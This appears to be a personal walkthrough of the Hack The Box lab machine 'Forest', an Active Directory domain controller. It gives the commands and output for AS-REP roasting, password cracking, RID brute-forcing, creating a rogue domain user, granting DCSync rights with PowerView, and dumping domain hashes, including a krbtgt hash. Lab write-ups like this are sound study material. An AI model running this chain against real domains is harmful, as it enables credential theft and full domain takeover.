# Forest

## nmap scan

```text
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-29 10:35:19Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
```

seems to be a domain controller

and we got a domain name `htb.local` from the nmap scan

lets try `smbclient -L \\\\10.10.10.161\\` =&gt; so we have nothing here, cant do rpcclient as well

sometimes, this works :P,

AS-REP roasting

```text
GetNPUsers.py -dc-ip 10.10.10.161 htb.local/
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-07-29 10:39:57.352002  2021-07-29 05:45:57.315643  0x410200
```

so if we append `-request` to the above command at the end, we will get a krb asrep token, which we can crack using john

```text
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:10 DONE (2021-07-29 10:36) 0.09442g/s 385813p/s 385813c/s 385813C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

now that we got some creds, we can run some commmands, lets start ny putting these into files, users and pass

so, first thing we should do it run a lookupsids.py \(from impacket\) - this does a user RID bruteforce, basically loops through the User IDs in windows and finds out the user names from that

```text
sebastien
lucinda
svc-alfresco
Service
Privileged
andy
mark
santi
```

so there are some other usernames as well in there, but those seem obselete, so I've a copy of them in /tmp/t, just in case

lets check if we can roast any of them, before that lets check if we can do evil-winrm - yep, so we got user so fast :P

kerberoasting doesn't seem to work, giving weird errors, lets move on...

anyways, since we are on the box, I'm going to run sharphound to give us some more data,

lets copy the SharpHound.exe from our local machine to the target machine

```text
on local machine,
smbserver.py -u guest -password guest -smb2support kalishare $(pwd)

on windows target,
net use x: \\10.10.14.77\kalishare /user:guest guest
cd x:
.\SharpHound.exe -c all
```

now that we have the zip file, lets have a look at bloodhound

we find that, our guy is a part of the `Account Operators` group, which means we can add users and stuff

so, looking at BloodHound, we find that the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` has the permission to `Write-DACL` on the domain, which means we add the ACL on the domain that a specific user will be able to do a DCSync on the domain

so, from the permission that we have above to add users, lets create and add a user to the `EXCHANGE WINDOWS PERMISSIONS` group and additionally `remote management users` local group ,we are also adding him to the domain with the /domain so that he'll be able to to secretsdump once he is in the correct groups,

we are adding him in the remote users group so that we'll be able to evil-winrm as that user once we create him

```text
net user foo1 P@$$W0RD /add /domain
net localgroup "remote management users" foo1 /add
net group "EXCHANGE WINDOWS PERMISSIONS" foo1 /add
```

even I dont know, how we can check first that if we'll be able to add users and add them to specific groups, so we have to just try the attacks based on how the domain looks like

now, we can winrm as the foo1 user, and once we do that, since we are the member of `EXCHANGE WINDOWS PERMISSIONS` group, we'll be able to modify the ACL on the domain to allow us to do a DCSync \(atleast that it what I understand\)

we can do this in two ways which I've explored, and both of them require PowerView.ps1, so lets get powerview on our machine, and since we are in the evil-winrm session, we can just run `upload PowerView.ps1`, and it will find a file in our current working directory \(where we winrm'ed from\), and uploads it to the windows machine

so, once we have PowerView.ps1 on remote, we can just source it diretly as we are already in winrm powershell session

`. .\PowerView.ps1`

now that we've sourced PowerView.ps1,

`add-objectacl -principalidentity foo1 -rights dcsync`

so as we are already logged in as foo1 now, we dont need the credential variable, but if we're not logged in separately as this user, we have to specify the credential with

```text
$pass = convertto-securestring 'P@$$word' -asplain -force
$cred = new-object system.management.automation.pscredential('htb.local\foo1', $pass)
add-objectacl -principalidentity foo1 -credential $cred -rights dcsync
```

other way is \(which i've bashed around a lot :\)\)

`Add-DomainObjectAcl -credential $cred -principalidentity foo1 -TargetIdentity "DC=htb,DC=local" -Rights DCSync`

so, one of these methods will give you \(the user foo1\) the right to do a DCSync

lets do a secretsdump.py since we have the rights now

```text
secretsdump.py -dc-ip 10.10.10.161 htb.local/foo1@FOREST                                                                                                                                                                                 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation                                                                                                                                                                                     

Password:                                                                                                                                                                                                                                    
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                                                                           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                                
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                                         
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::                                                                                                                                             
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                               
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                                                                              
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

there we go, now we should have all the hashes \(replaced the admin hash with null one\)

now, we can do another evil-winrm to get into the box as admin

